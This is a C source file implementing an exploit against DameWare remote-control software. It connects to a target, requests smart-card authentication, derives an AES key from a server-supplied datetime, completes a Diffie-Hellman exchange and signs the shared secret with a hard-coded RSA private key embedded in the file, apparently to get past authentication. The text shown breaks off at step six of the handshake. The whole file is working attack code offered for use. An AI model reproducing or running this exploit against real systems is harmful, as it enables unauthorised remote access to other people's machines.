#include <ws2tcpip.h>
#include <stdio.h>
#include <string.h> // strcpy_s
#include <bcrypt.h>
//#include <ncrypt.h>
//#include <wincrypt.h>
//#include <ntstatus.h>
#include <string>

#include "dameware.h"
#include "debug.h"
#include "openssl/dh.h"
#include "openssl/evp.h"
#include "openssl/err.h"
#include "openssl/rsa.h"
#include "openssl/pem.h"
#include "openssl/evp.h"

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS 0
#endif

const char* szRsaPrivKey = "-----BEGIN RSA PRIVATE KEY-----\n"
"MIICXQIBAAKBgQCtjIF7xwvK91C706B9wKQx490ozpl4BZKUQQOF9fAkd5uxphvH\n"
"mnlNaa7LwVqItmKfk/VLyoZsI65PQ6yBfNmBfjC0zHhrd9C7IBw1vk0SREpjFOz8\n"
"moaiT5i5tUlfbDcIwB3WM2eXfA02YnAl2NToRGFZ42HKuJ4UFKovy4kQGwIDAQAB\n"
"AoGBAKFgzyLXMzsYAIW3wzxMPyJ5PbTtcD3wCJ49WlZeHGD8q9Vknd5c4UE/7Z9g\n"
"e5w25Lx47Bb/C0JRZ4wjZKy/+Mvt6EZmQI9wRhCcYwd0M2QmJaY0Q4+VqXDRQGkL\n"
"+MhiX43oj8RGvwmrg2j+Xy0tO9n11TI0vDcXyxNQlm4mgsI5AkEA2V0kbDunhX/Z\n"
"an7cTtxnEB1urBmpo/fAJwrDA5S1FlT8JztBvFKAaxQBHayfwAS5JgGWaNi5mq3Y\n"
"oZaEk6LYrwJBAMxlnqgIe9c9YdKzz8ZPDGUlHmjGrATQxDqnnuve2SCazpJ3t4TA\n"
"G0K0yr78IIhoLQ/EbUQooEAPiCUIElGGQlUCQQCkUg2e5NoXyjcKkyzpUSV4wUdR\n"
"Q3VDR6Az46bZpinf4A9feSSQwa3jRRQy4rVB7FArszeJu41UqegDAE7pbUpxAkBO\n"
"I3MZzdR6Hm8tO6xspX+Zky0i5QCR/rVlrvrkNRdQjZ33BGlWCJLjV3ZCuOQ/AYRo\n"
"iLE040sP8mAbuBA4tljZAkBlsd4Tq6oBDVRThoUIW8jABnu6UcaADqTS9WNbPD/R\n"
"MGakK2CHnQRfFuxRAp9TqiLftJIBDpumbF6dL9hrYNdH\n"
"-----END RSA PRIVATE KEY-----\n\0";

char* rsa_pubkey = (char*)"\x30\x81\x89\x02\x81\x81\x00\xAD\x8C\x81\x7B\xC7\x0B\xCA\xF7\x50"
"\xBB\xD3\xA0\x7D\xC0\xA4\x31\xE3\xDD\x28\xCE\x99\x78\x05\x92\x94"
"\x41\x03\x85\xF5\xF0\x24\x77\x9B\xB1\xA6\x1B\xC7\x9A\x79\x4D\x69"
"\xAE\xCB\xC1\x5A\x88\xB6\x62\x9F\x93\xF5\x4B\xCA\x86\x6C\x23\xAE"
"\x4F\x43\xAC\x81\x7C\xD9\x81\x7E\x30\xB4\xCC\x78\x6B\x77\xD0\xBB"
"\x20\x1C\x35\xBE\x4D\x12\x44\x4A\x63\x14\xEC\xFC\x9A\x86\xA2\x4F"
"\x98\xB9\xB5\x49\x5F\x6C\x37\x08\xC0\x1D\xD6\x33\x67\x97\x7C\x0D"
"\x36\x62\x70\x25\xD8\xD4\xE8\x44\x61\x59\xE3\x61\xCA\xB8\x9E\x14"
"\x14\xAA\x2F\xCB\x89\x10\x1B\x02\x03\x01\x00\x01";
uint32_t rsa_pubkey_len = 140;


NTSTATUS aes_decrypt(char* crypt, size_t crypt_len, char* key, size_t key_len, char* iv, size_t iv_len, char** decrypt, size_t* decrypt_len)
{
	if (!decrypt || !decrypt_len) {
		printf("invalid input pointers decrypt or dcrypt_len\n");
		return -1;
	}

	NTSTATUS stat = -1;
	BCRYPT_ALG_HANDLE hAesAlg;
	BCRYPT_KEY_HANDLE hKey;
	PUCHAR keyObject = NULL;
	ULONG keyObjectLen = 0;
	ULONG blockLen = 0;
	ULONG result = 0;

	PUCHAR ivCopy = NULL;

	stat = BCryptOpenAlgorithmProvider(&hAesAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (stat != STATUS_SUCCESS) {
		printf("Fatal could not get handle to AES crypto alogrithm 0x%x, %d\n", GetLastError(), GetLastError());
		return stat;
	}

	stat = BCryptGetProperty(hAesAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjectLen, sizeof(ULONG), &result, 0);
	if (stat != STATUS_SUCCESS) {
		printf("Could not get keyObject block size BCryptGetProperty 0x%x, %d\n", stat, stat);
		goto cleanup;
	}

	keyObject = (PUCHAR)calloc(keyObjectLen, sizeof(UCHAR));
	if (!keyObject) {
		printf("Failed to allocate keyObject of size %d. Error 0x%x, %d\n", keyObjectLen, GetLastError(), GetLastError());
		stat = -1;
		goto cleanup;
	}

	stat = BCryptGetProperty(hAesAlg, BCRYPT_BLOCK_LENGTH, (PUCHAR)&blockLen, sizeof(ULONG), &result, 0);
	if (stat != STATUS_SUCCESS) {
		printf("Could not get block size BCryptGetProperty 0x%x, %d\n", stat, stat);
		goto cleanup;
	}

	// make sure keyObjectLen is not longer than the IV length
	if (blockLen > iv_len) {
		printf("Failure. block length is longer than IV length\n");
		stat = -1;
		goto cleanup;
	}

	// make a copy of the IV..i think this is needed cause encrypt/decrypt will change original IV buffer
	ivCopy = (PUCHAR)calloc(iv_len, sizeof(UCHAR));
	if (!ivCopy) {
		printf("Failed to allocate iv copy of size %lld. Error 0x%x, %d\n", iv_len, GetLastError(), GetLastError());
		stat = -1;
		goto cleanup;
	}
	memcpy(ivCopy, iv, iv_len);

	stat = BCryptSetProperty(hAesAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (stat != STATUS_SUCCESS) {
		printf("Failed to set encrypted mode CHAINING CBC 0x%x, %d\n", stat, stat);
		goto cleanup;
	}

	stat = BCryptGenerateSymmetricKey(hAesAlg, &hKey, keyObject, keyObjectLen, (PUCHAR)key, (ULONG)key_len, 0);
	if (stat != STATUS_SUCCESS) {
		printf("failed to generate key object 0x%x, %d\n", stat, stat);
		goto cleanup;
	}

	// get size of decrypt buffer first
	//stat = BCryptDecrypt(hKey, (PUCHAR)crypt, crypt_len, NULL, ivCopy, iv_len, NULL, NULL, (ULONG*)decrypt_len, BCRYPT_BLOCK_PADDING);
	stat = BCryptDecrypt(hKey, (PUCHAR)crypt, (ULONG)crypt_len, NULL, ivCopy, (ULONG)iv_len, NULL, NULL, (ULONG*)decrypt_len, 0);
	if (stat != STATUS_SUCCESS || *decrypt_len == 0) {
		printf("Failed to get dencrypted buffer size 0x%x, %d\n", stat, stat);
		goto cleanup;
	}

	(*decrypt) = (char*)calloc(*decrypt_len, sizeof(char));
	if (!(*decrypt)) {
		printf("failed to allocate decryption buffer. 0x%x, %d\n", GetLastError(), GetLastError());
		stat = -1;
		goto cleanup;
	}

	// get size of decrypt buffer first
	//stat = BCryptDecrypt(hKey, (PUCHAR)crypt, crypt_len, NULL, ivCopy, iv_len, (PUCHAR)*decrypt, *decrypt_len, (ULONG*)decrypt_len, BCRYPT_BLOCK_PADDING);
	stat = BCryptDecrypt(hKey, (PUCHAR)crypt, (ULONG)crypt_len, NULL, ivCopy, (ULONG)iv_len, (PUCHAR)*decrypt, (ULONG)*decrypt_len, (ULONG*)decrypt_len, 0);
	if (stat != STATUS_SUCCESS || *decrypt_len == 0) {
		printf("Failed to decrypt buffer. 0x%x, %d\n", stat, stat);
		goto cleanup;
	}

cleanup:
	if (hAesAlg) {
		BCryptCloseAlgorithmProvider(hAesAlg, 0);
	}

	if (keyObject) {
		free(keyObject);
	}

	if (ivCopy) {
		free(ivCopy);
	}

	return stat;
}

int dh_generate(char* srv_pubkey, size_t srv_pubkey_len, char** clt_pubkey, uint32_t* clt_pubkey_len, unsigned char** secret, uint32_t* secret_len)
{
	int ret = -1;

	// hard coded prime and generator strings
	const char* dh_prime = "F51FFB3C6291865ECDA49C30712DB07B";
	const char* dh_gen = "3";

	DH* dhp = NULL;

	BIGNUM* p = NULL, * g = NULL;
	BIGNUM* pubkey = NULL;
	unsigned char* raw_pubkey = NULL;
	size_t raw_pubkey_len = 0;

	BIGNUM* server_public_key = NULL;

	unsigned char* raw_secret = NULL;
	int raw_secret_len = 0;

	// input validation
	if (!clt_pubkey || !clt_pubkey_len || !secret || !secret_len) {
		printf("invalid input parameters\n");
		return -1;
	}

	// initialize openssl diffie helman object
	dhp = DH_new();
	if (dhp == NULL) {
		printf("Error creating new openssl diffie-helman \n");
		return -1;
	}

	// convert string represenations of prime and generator to BIGNUM formats
	ret = BN_hex2bn(&p, dh_prime);
	if (ret == 0) {
		printf("Error converting dh_prime to openssl BIGNUM. %d, %s\n", ERR_get_error(), ERR_error_string(ERR_get_error(), NULL));
		goto cleanup;
	}
	printf("dh_prime converted openssl BIGNUM\n");
	ret = BN_dec2bn(&g, dh_gen);
	if (ret == 0) {
		printf("Error converting dh_gen to openssl BIGNUM. %d, %s\n", ERR_get_error(), ERR_error_string(ERR_get_error(), NULL));
		goto cleanup;
	}
	printf("dh_gen converted openssl BIGNUM\n");

	// set the prime and generator values for the diffie helman object
	ret = DH_set0_pqg(dhp, p, NULL, g);
	if (ret != 1) {
		printf("Error setting prime and generator values. %d, %s\n", ERR_get_error(), ERR_error_string(ERR_get_error(), NULL));
		goto cleanup;
	}
	printf("openssl set prime and generator values\n");

	// generate private and public keys for the client
	ret = DH_generate_key(dhp);
	if (ret != 1) {
		printf("Error generating key object. %d, %s\n", ERR_get_error(), ERR_error_string(ERR_get_error(), NULL));
		goto cleanup;
	}
	printf("openssl diffie helman key object created\n");

	// retrieve BIGNUM form of client public key from diffie helman object
	pubkey = (BIGNUM*)DH_get0_pub_key(dhp);
	if (!pubkey) {
		printf("Error allocating space for client public key. 0x%x, %d\n", GetLastError(), GetLastError());
		goto cleanup;
	}

	// allocate space for raw public key to go when converted
	raw_pubkey = (unsigned char*)OPENSSL_zalloc(DH_size(dhp) * sizeof(unsigned char));
	//raw_pubkey = (unsigned char*)calloc(4096, 1); // hardcoded could be bad..but with hardcoded prime above is fine for now
	if (!raw_pubkey) {
		printf("Error allocating space for client public key. 0x%x, %d\n", GetLastError(), GetLastError());
		goto cleanup;
	}

	// convert public key from BIGNUM format to raw
	raw_pubkey_len = BN_bn2bin(pubkey, raw_pubkey);
	if (raw_pubkey_len == 0) {
		printf("Error converting BIGNUM public key to raw. %d, %s\n", ERR_get_error(), ERR_error_string(ERR_get_error(), NULL));
		goto cleanup;
	}

	// Convert server public key to BIGNUM
	server_public_key = BN_bin2bn((const unsigned char*)srv_pubkey, (int)srv_pubkey_len, NULL);
	if (!server_public_key) {
		printf("Error converting srv_pubkey to BIGNUM format. 0x%x, %d\n", GetLastError(), GetLastError());
		return -1;
	}

	// allocate memory for shared secret
	raw_secret = (unsigned char*)OPENSSL_zalloc(DH_size(dhp) * sizeof(unsigned char*));
	if (!raw_secret) {
		printf("Error allocating space for client public key. 0x%x, %d\n", GetLastError(), GetLastError());
		goto cleanup;
	}

	// computer the shared secret
	raw_secret_len = DH_compute_key(raw_secret, server_public_key, dhp);
	if (raw_secret_len < 1) {
		printf("Error allocating space for client public key. 0x%x, %d\n", GetLastError(), GetLastError());
		goto cleanup;
	}

	// copy raw return values to non-openssl buffers
	(*clt_pubkey) = (char*)calloc(raw_pubkey_len, sizeof(char));
	(*secret) = (unsigned char*)calloc(raw_secret_len, sizeof(char));
	if (!(*clt_pubkey) || !(*secret)) {
		printf("Error allocating space for return buffers. 0x%x, %d\n", GetLastError(), GetLastError());
		goto cleanup;
	}
	memcpy((*clt_pubkey), raw_pubkey, raw_pubkey_len);
	memcpy((*secret), raw_secret, raw_secret_len);
	(*clt_pubkey_len) = (uint32_t)raw_pubkey_len;
	(*secret_len) = raw_secret_len;

	printf("Client Public Key\n");
	displayRawData((unsigned char*)(*clt_pubkey), (int)raw_pubkey_len);
	printf("Shared secret\n");
	displayRawData((unsigned char*)(*secret), (int)raw_secret_len);

cleanup:
	if (raw_secret)
		OPENSSL_free(raw_secret);

	if (server_public_key)
		BN_free(server_public_key);

	if (raw_pubkey)
		OPENSSL_free(raw_pubkey);

	if (dhp)
		DH_free(dhp);

	return ret;
}

int rsa_sign(unsigned char* input, size_t input_len, char** signed_data, uint32_t* signed_data_len)
{
	int ret = 0;
	RSA* rsa = NULL;

	EVP_MD_CTX* m_RSASignCtx = NULL;
	EVP_PKEY* priKey = NULL;

	if (!signed_data || !signed_data_len) {
		printf("invalid input to rsa_sign2\n");
		return -1;
	}

	// create new buffer to hold openssl private key buf
	BIO* keybio = BIO_new_mem_buf(szRsaPrivKey, -1);
	if (keybio == NULL) {
		printf("Error BIO_new_mem_buf. %d, %s\n", ERR_get_error(), ERR_error_string(ERR_get_error(), NULL));
		goto cleanup;
	}

	// convert PEM to openssl key structure
	rsa = PEM_read_bio_RSAPrivateKey(keybio, &rsa, NULL, NULL);
	if (rsa == NULL) {
		printf("Error PEM_read_bio_RSAPrivateKey. %d, %s\n", ERR_get_error(), ERR_error_string(ERR_get_error(), NULL));
		goto cleanup;
	}

	// create necessary signing and key objects objects
	m_RSASignCtx = EVP_MD_CTX_new();
	priKey = EVP_PKEY_new();
	EVP_PKEY_assign_RSA(priKey, rsa);

	// initialize signing context object
	ret = EVP_DigestSignInit(m_RSASignCtx, NULL, EVP_sha512(), NULL, priKey);
	if (ret != 1) {
		printf("Error EVP_DigestSignInit. %d, %s\n", ERR_get_error(), ERR_error_string(ERR_get_error(), NULL));
		goto cleanup;
	}

	// input data to be signed to context
	ret = EVP_DigestSignUpdate(m_RSASignCtx, input, input_len);
	if (ret != 1) {
		printf("Error EVP_DigestSignUpdate. %d, %s\n", ERR_get_error(), ERR_error_string(ERR_get_error(), NULL));
		goto cleanup;
	}

	// get final size for signed data
	ret = EVP_DigestSignFinal(m_RSASignCtx, NULL, (size_t*)signed_data_len);
	if (ret != 1) {
		printf("Error EVP_DigestSignFinal. %d, %s\n", ERR_get_error(), ERR_error_string(ERR_get_error(), NULL));
		goto cleanup;
	}

	// allocate space for signed data
	*signed_data = (char*)calloc(*signed_data_len, sizeof(char));
	if (!(*signed_data)) {
		printf("Error allocating space for return buffers. 0x%x, %d\n", GetLastError(), GetLastError());
		goto cleanup;
	}

	// do signing
	ret = EVP_DigestSignFinal(m_RSASignCtx, (unsigned char*)*signed_data, (size_t*)signed_data_len);
	if (ret != 1) {
		printf("Error EVP_DigestSignFinal. %d, %s\n", ERR_get_error(), ERR_error_string(ERR_get_error(), NULL));
		goto cleanup;
	}

cleanup:
	if (m_RSASignCtx)
		EVP_MD_CTX_free(m_RSASignCtx);

	if (keybio)
		BIO_free(keybio);

	return ret;
}

int dameware_recvall(SOCKET sock, char** recvbuf, size_t* recvbuf_len, uint32_t bytes_to_receive, size_t offset)
{
	int res = 0;

	if (!recvbuf || !recvbuf_len) {
		printf("dameware_recvall invalid input\n");
		return -1;
	}

	// allocate buffer to recieve data
	if ((*recvbuf) == NULL) { // no buffer allocated
		// alocate a new one
		(*recvbuf) = (char*)calloc(offset + bytes_to_receive, sizeof(char));
		(*recvbuf_len) = 0;
	}
	else if ((*recvbuf)) { // preallocated buffer already
		if (offset == 0) {
			//  offset 0, so need to start new, free and alocate a new one
			free(*recvbuf);
			(*recvbuf) = (char*)calloc(offset + bytes_to_receive, sizeof(char));
			(*recvbuf_len) = 0;
		}
		else { // offset > 0 means recvbuf already contains useful data so realloc to fit rest
			(*recvbuf) = (char*)realloc((*recvbuf), offset + bytes_to_receive);
			(*recvbuf_len) = offset;
		}
	}
	else {
		// TODO
	}

	if ((*recvbuf)) {
		// receive rest of message data
		while (bytes_to_receive > 0) {
			res = recv(sock, (*recvbuf) + offset, bytes_to_receive, 0);
			if (res == SOCKET_ERROR) {
				printf("Receive in dameware_recv failed: 0x%x, %d\n", WSAGetLastError(), WSAGetLastError());
				return -1;
			}
			else {
				bytes_to_receive -= res;
				offset += res;
				(*recvbuf_len) += res;
			}
		}
	}
	else {
		printf("realloc for receive buffer in dameware_recv failed. 0x%x, %d\n", GetLastError(), GetLastError());
		return -1;
	}

	return res;
}

int dameware_recvx(SOCKET sock, uint32_t* type, char** recvbuf, size_t* recvbuf_len)
{
	int res = 0;
	uint32_t size = 0;
	uint32_t bytes_to_receive = 0;
	size_t offset = 0;

	if (!type || !recvbuf || !recvbuf_len) {
		printf("Error in dameware_recv. invalid input vars\n");
		return -1;
	}

	// cleanup any existing allocated recvbuf
	if (*recvbuf) {
		free(*recvbuf);
		//*recvbuf = NULL;
		*recvbuf_len = 0;
	}

	// allocate space for new header
	*recvbuf = (char*)calloc(sizeof(struct dameware_hdr), sizeof(char));
	if (!(*recvbuf)) {
		printf("receive buffer allocation (header) failed %d\n", GetLastError());
		return -1;
	}
	struct dameware_hdr* hdr = (struct dameware_hdr*)(*recvbuf);

	// recv data for dameware message header
	res = recv(sock, *recvbuf, sizeof(struct dameware_hdr), 0);
	if (res == sizeof(struct dameware_hdr)) {
		printf("testing: 0x%x, %d, %d\n", hdr->type, hdr->unk, size);
		//*type = ntohl(hdr->type);
		//size = ntohl(hdr->size);
		*type = hdr->type;
		size = hdr->size;

		*recvbuf_len = sizeof(struct dameware_hdr) + size;

		// if more message data to follow...
		if (size > 0) {
			offset = sizeof(struct dameware_hdr);
			bytes_to_receive = size;

			res = dameware_recvall(sock, recvbuf, recvbuf_len, bytes_to_receive, offset);
		}
	}
	else {
		printf("Error dameware_recv. not enough data received for dameware_hdr %d\n", res);
		return -1;
	}

	return res;
}

void dameware_exploit(char* target, char* payload, size_t payload_len, short port)
{
	if (!target || !payload)
		return;

	char portstr[64] = { 0 };
	errno_t err = _itoa_s(port, portstr, 10);

	SOCKET sock = INVALID_SOCKET;
	struct addrinfo* result = NULL, * ptr = NULL, hints;
	int res;

	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	res = getaddrinfo(target, portstr, &hints, &result);
	if (res != 0) {
		printf("[-] getaddrinfo failed with error: %d\n", res);
		return;
	}

	//Attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
		//Create a SOCKET for connecting to target
		sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (sock == INVALID_SOCKET) {
			printf("[-] socket failed with error: %ld\n", WSAGetLastError());
			break;
		}

		//attempt connection
		res = connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (res == SOCKET_ERROR) {
			closesocket(sock);
			sock = INVALID_SOCKET;
			continue;
		}
		break;
	}

	freeaddrinfo(result);

	// check for active connection
	if (sock == INVALID_SOCKET) {
		printf("Unable to connect to server %d\n", WSAGetLastError());
		return;
	}

	// START EXPLOITATION

	BOOL ret = FALSE;
	uint32_t* buffer = NULL;
	char* recvbuf = NULL;
	size_t recvbuf_len = 0;
	uint32_t type = 0;

	// step 1 vars
	struct smart_card_request scr;
	char tempbuf[0x29] = { 0 };

	// step 2 vars
	char datetime[128] = { 0 };
	wchar_t wdatetime[128] = { 0 };
	size_t retval = 0;
	char* salt = (char*)"\x54\x40\xf4\x91\xa6\x06\x25\xbc";
	char key[17] = { 0 };
	NTSTATUS stat = 0;
	BCRYPT_ALG_HANDLE hSha512Alg = NULL;

	// step 3 vars
	uint32_t enc_len = 0;
	char* iv = (char*)"\x54\x40\xF4\x91\xA6\x06\x25\xBC\x8E\x84\x56\xD6\xCB\xB7\x40\x59";
	char* crypt = NULL;
	char* param = NULL;
	size_t param_len = 0;

	// step 4 vars
	uint32_t pubkey_len = 0;
	char* srv_pubkey = NULL;
	char* clt_pubkey = NULL;
	uint32_t clt_pubkey_len = 0;
	unsigned char* shared_secret = NULL;
	uint32_t shared_secret_len = 0;
	uint32_t clt_sum = 0;

	// step 5 vars
	uint32_t srv_sum = 0;
	char* hash = NULL;
	size_t hash_len = 0;
	char* rsa_sig = NULL;
	uint32_t rsa_sig_len = 0;
	//uint32_t rsa_pubkey_len = strlen(rsa_pubkey);

	// step 10 vars
	char* sendbuf = NULL;
	size_t sendbuf_len = 0;
	uint32_t* sendbuf2 = NULL;

	// STEP 1 - MSG_TYPE_VESION
	printf("Step 1 - Receive MSG_TYPE_VERSION\n");
	res = recv(sock, tempbuf, 0x28, 0);
	type = ((struct dameware_hdr*)tempbuf)->type;
	recvbuf_len = res;
	if (res >= 0 && type == MSG_TYPE_VERSION && recvbuf_len == 0x28) {
		// Send MSG_TYPE_VERSION, requesting smart card auth
		scr.type = MSG_TYPE_VERSION;
		scr.unk = 0;
		scr.one = 12.0;
		scr.two = 0.0;
		scr.three = 4;
		scr.four = 0;
		scr.five = 0;
		scr.six = 3;
		res = send(sock, (const char*)&scr, sizeof(struct smart_card_request), 0);
		if (res != sizeof(struct smart_card_request)) {
			printf("Error sending MSG_TYPE_VERSION (smart card auth) error: %d, datasent: %d, datatosend: %lld\n", WSAGetLastError(), res, sizeof(struct smart_card_request));
			goto cleanup;
		}
	}
	else {
		printf("Error receiving step 1 MSG_TYPE_VERSION message. res: %d, type: 0x%x recvbuf_len: 0x%llx\n", res, type, recvbuf_len);
		goto cleanup;
	}

	// STEP 2 - MSG_CLIENT_INFORMATION_V7
	printf("Step 2 - Receive MSG_CLIENT_INFORMATION_V7\n");
	res = dameware_recvall(sock, &recvbuf, &recvbuf_len, 0x3af8, 0);
	type = ((struct dameware_hdr*)recvbuf)->type;
	if (res >= 0 && type == MSG_CLIENT_INFORMATION_V7 && recvbuf_len == 0x3af8) {
		// Pick out the datetime string
		//err = strcpy_s(datetime, recvbuf + 8);
		err = wcscpy_s(wdatetime, (wchar_t*)(recvbuf + 8));
		if (err != 0) {
			printf("Error getting datetime string out of MSG_CLIENT_INFORMATION_V7, %d\n", GetLastError());
			goto cleanup;
		}
		err = wcstombs_s(&retval, datetime, wdatetime, 128);
		if (err != 0) {
			printf("error converting wchar_t to char datetine, 0x%x, %d\n", err, err);
		}
		printf("Retrieved date string from message, %s\n", datetime);

		// Create PBKDF2 derived key
		//stat = BCryptOpenAlgorithmProvider(&alg, BCRYPT_PBKDF2_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
		stat = BCryptOpenAlgorithmProvider(&hSha512Alg, BCRYPT_SHA512_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
		if (stat == STATUS_SUCCESS) {
			stat = BCryptDeriveKeyPBKDF2(hSha512Alg, (PUCHAR)datetime, (ULONG)strlen(datetime), (PUCHAR)salt, (ULONG)strlen(salt), 1000, (PUCHAR)key, 16, 0);
			if (stat != STATUS_SUCCESS) {
				printf("Failed to create PBKDF2 key from datetime %d\n", GetLastError());
				goto cleanup;
			}
		}
		else {
			printf("Failed to get HMAC/SHA512 algorithm provider %d\n", GetLastError());
			goto cleanup;
		}

		printf("Derived key from datetime: %s\n", datetime);
		displayRawData((unsigned char*)key, 16);

		// Send MSG_CLIENT_INFORMATION_V7
		// Should be able to use the one sent by the server
		res = send(sock, recvbuf, (int)recvbuf_len, 0);
		if (res != recvbuf_len) {
			printf("Error sending MSG_CLIENT_INFORMATION_V7 error: %d, datasent: %d, datatosend: %lld\n", WSAGetLastError(), res, recvbuf_len);
			// goto cleanup
			// TODO send rest???
		}
	}
	else {
		printf("Error receiving step 2 MSG_CLIENT_INFORMATION_V7 message. type: 0x%x recvbuf_len: 0x%llx\n", type, recvbuf_len);
		goto cleanup;
	}

	// STEP 3 - MSG_TYPE_RSA_CRYPTO_C_INIT
	printf("Step 3 - Receive MSG_TYPE_RSA_CRYPTO_C_INIT\n");
	res = dameware_recvall(sock, &recvbuf, &recvbuf_len, 0x1220, 0);
	type = ((struct dameware_hdr*)recvbuf)->type;
	if (res >= 0 && type == MSG_TYPE_RSA_CRYPTO_C_INIT && recvbuf_len == 0x1220) {
		buffer = (uint32_t*)recvbuf;
		//enc_len = ntohl(buffer[1]);
		enc_len = buffer[1];
		crypt = (char*)calloc(enc_len, sizeof(char));
		if (!crypt) {
			printf("Fatal - calloc failed for crypt variable %d\n", GetLastError());
			goto cleanup;
		}
		else {
			// fill buffer with data to be encrypted
			if ((enc_len + 0x100c) > 0x1220) {
				printf("Fatal - bad enc_len value from message: %d, total len of buff: 0x1220\n", enc_len);
				goto cleanup;
			}
			else {
				memcpy(crypt, recvbuf + 0x100c, enc_len);
			}

			stat = aes_decrypt(crypt, enc_len, key, 16, iv, strlen(iv), &param, &param_len);
			if (stat != STATUS_SUCCESS) {
				printf("failed to decrypt data. 0x%x, %d\n", stat, stat);
				goto cleanup;
			}
		}

		printf("Encrypted server MSG_TYPE_RSA_CRYPTO_C_INIT params\n");
		displayRawData((unsigned char*)crypt, enc_len);
		printf("Decrypted server MSG_TYPE_RSA_CRYPTO_C_INIT params\n");
		displayRawData((unsigned char*)param, (int)param_len);

		// Send MSG_TYPE_RSA_CRYPTO_C_INIT
		// Should be able to use the one sent by the server
		res = send(sock, recvbuf, (int)recvbuf_len, 0);
		if (res != recvbuf_len) {
			printf("Error sending MSG_CLIENT_INFORMATION_V7 error: %d, datasent: %d, datatosend: 0x%llx\n", WSAGetLastError(), res, recvbuf_len);
			// goto cleanup
			// TODO send rest???
		}
	}
	else {
		printf("Error receiving step 3 MSG_TYPE_RSA_CRYPTO_C_INIT message. type: 0x%x recvbuf_len: 0x%llx\n", type, recvbuf_len);
		goto cleanup;
	}

	// STEP 4 - MSG_000105b9 (1)
	printf("Step 4 - Receive MSG_000105b9 (1)\n");
	res = dameware_recvall(sock, &recvbuf, &recvbuf_len, 0x2c2c, 0);
	type = ((struct dameware_hdr*)recvbuf)->type;
	if (res >= 0 && type == MSG_000105b9 && recvbuf_len == 0x2c2c) {
		// Get serer DH public key
		//pubkey_len = ntohl(*((uint32_t*)(recvbuf + 0x140c)));
		pubkey_len = *((uint32_t*)(recvbuf + 0x140c));
		srv_pubkey = (char*)calloc(pubkey_len, sizeof(char));
		if (!srv_pubkey) {
			printf("Fatal - calloc failed for srv_pubkey variable %d\n", GetLastError());
			goto cleanup;
		}
		else {
			// fill buffer with data to be encrypted
			if (((size_t)pubkey_len + 0x100c) > recvbuf_len) {
				printf("Fatal - bad pubkey_len value from message: %d, total len of buff: 0x%llx\n", pubkey_len, recvbuf_len);
				goto cleanup;
			}
			else {
				memcpy(srv_pubkey, recvbuf + 0x100c, pubkey_len);
			}
		}

		stat = dh_generate(srv_pubkey, pubkey_len, &clt_pubkey, &clt_pubkey_len, &shared_secret, &shared_secret_len);
		if (stat != 1) {
			printf("dh_generate failed 0x%x, %d\n", stat, stat);
			goto cleanup;
		}

		// Compute the sum of the bytes in the shared secret
		for (unsigned int i = 0; i < shared_secret_len; i++) {
			clt_sum += (size_t)(shared_secret[i]);
		}

		// Send MSG_000105b9(1)
		// Fill in client DH public keyand length
		memcpy(recvbuf + 0x1418, clt_pubkey, clt_pubkey_len);
		memcpy(recvbuf + 0x1818, &clt_pubkey_len, 4); // TODO make sure this is correct byte order
		res = send(sock, recvbuf, (int)recvbuf_len, 0);
		if (res != recvbuf_len) {
			printf("Error sending MSG_000105b9 error: %d, datasent: %d, datatosend: 0x%llx\n", WSAGetLastError(), res, recvbuf_len);
			// goto cleanup
			// TODO send rest???
		}
	}
	else {
		printf("Error receiving step 4 MSG_000105b9 (1) message. type: 0x%x recvbuf_len: 0x%llx\n", type, recvbuf_len);
		goto cleanup;
	}

	// STEP 5 - MSG_000105b9 (2)
	// Server send back the length and addsum of the shared secret
	printf("Step 5 - Receive MSG_000105b9 (2)\n");
	res = dameware_recvall(sock, &recvbuf, &recvbuf_len, 0x2c2c, 0);
	type = ((struct dameware_hdr*)recvbuf)->type;
	if (res >= 0 && type == MSG_000105b9 && recvbuf_len == 0x2c2c) {
		//srv_sum = ntohl(*((uint32_t*)(recvbuf + 0x1820)));
		srv_sum = *((uint32_t*)(recvbuf + 0x1820));
		printf("client-computed sum of the DH shared secret: 0x%x\n", clt_sum);
		printf("server-computed sum of the DH shared secret: 0x%x\n", srv_sum);

		stat = rsa_sign(shared_secret, shared_secret_len, &rsa_sig, &rsa_sig_len);
		if (stat != 1) {
			printf("rsa_sign of shared secret hash failed 0x%x, %d\n", stat, stat);
			goto cleanup;
		}
		printf("RSA signature of the DH shared secret\n");
		displayRawData((unsigned char*)rsa_sig, rsa_sig_len);

		// Fill in the length and sum of the client-computed DH shared secret
		memcpy(recvbuf + 0x1410, &shared_secret_len, sizeof(uint32_t));
		memcpy(recvbuf + 0x1414, &clt_sum, sizeof(uint32_t));

		// Fill in the RSA signature of the DH shared secret
		memcpy(recvbuf + 0x1824, rsa_sig, rsa_sig_len);
		memcpy(recvbuf + 0x2024, &rsa_sig_len, sizeof(uint32_t));

		// Fill in the RSA public key
		memcpy(recvbuf + 0x2028, rsa_pubkey, rsa_pubkey_len); //TODO Make sure this is right size of!!!!
		memcpy(recvbuf + 0x2828, &rsa_pubkey_len, sizeof(uint32_t));

		res = send(sock, recvbuf, (int)recvbuf_len, 0);
		if (res != recvbuf_len) {
			printf("Error sending MSG_000105b9 error: %d, datasent: %d, datatosend: 0x%llx\n", WSAGetLastError(), res, recvbuf_len);
			// goto cleanup
			// TODO send rest???
		}
	}
	else {
		printf("Error receiving step 5 MSG_000105b9 (2) message. type: 0x%x recvbuf_len: 0x%llx\n", type, recvbuf_len);
		goto cleanup;
	}

	// STEP 6 - MSG_REGISTRATION_INFORMATION
	// Server should send MSG_REGISTRATION_INFORMATION
	printf("Step 6 - Receive MSG_REGISTRATION_INFORMATION\n");
	res = dameware_recvall(sock, &recvbuf, &recvbuf_len, 0xc50, 0);
	type = ((struct dameware_hdr*)recvbuf)->type;
